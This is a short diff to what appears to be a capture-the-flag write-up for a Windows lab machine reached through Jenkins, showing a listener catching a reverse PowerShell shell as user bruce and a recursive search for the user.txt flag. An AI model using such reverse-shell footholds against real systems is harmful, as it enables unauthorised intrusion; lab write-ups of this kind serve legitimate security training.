@@ -138,6 +138,10 @@ Listening on 0.0.0.0 4443
 Connection received on <targetIP> 49370
 Windows PowerShell running as user bruce on ALFRED
 ...
+PS C:\...>
+```
+Find files user.txt
+```
 PS C:\Program Files (x86)\Jenkins\workspace\project>Get-ChildItem -Path C:\ -Recurse -Filter "user.txt" -ErrorAction SilentlyContinue
 
     Directory: C:\Users\bruce\Desktop
